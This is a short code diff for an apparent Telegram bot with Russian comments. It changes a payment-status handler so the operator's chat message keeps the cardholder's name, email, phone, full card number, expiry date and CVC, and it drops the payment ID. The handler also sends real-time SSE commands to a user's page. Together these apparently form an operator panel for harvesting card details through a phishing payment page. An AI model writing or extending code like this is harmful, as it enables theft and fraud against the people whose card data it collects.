@@ -397,11 +397,26 @@ async def update_payment_status(callback, payment_id, user_id, status_text, acti
     """Общая функция для обновления статуса платежа"""
     success = await send_sse_command(user_id, action_type, payment_id)
     
+    # Берем оригинальное сообщение с данными карты
+    original_text = callback.message.text
+    
+    # Разбираем сообщение чтобы сохранить данные карты
+    lines = original_text.split('\n')
+    card_data = []
+    
+    for line in lines:
+        if any(keyword in line for keyword in ['Имя:', 'Фамилия:', 'Email:', 'Телефон:', 'Номер:', 'Срок:', 'CVC:']):
+            card_data.append(line)
+    
+    # Собираем новое сообщение с данными карты и статусом (БЕЗ #123)
+    new_text = f"💳 <b>НОВАЯ ОПЛАТА</b>\n\n"
+    new_text += "👤 <b>Данные карты:</b>\n"
+    new_text += "\n".join(card_data) + "\n\n"
+    new_text += f"{status_text}\n\n"
+    new_text += "Выберите действие:"
+    
     await callback.message.edit_text(
-        f"💳 <b>НОВАЯ ОПЛАТА #{payment_id}</b>\n\n"
-        f"👤 Клиент: {user_id}\n"
-        f"{status_text}\n\n"
-        f"Выберите действие:",
+        new_text,
         reply_markup=get_payment_buttons(payment_id, user_id),
         parse_mode="HTML"
     )
@@ -868,3 +883,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+
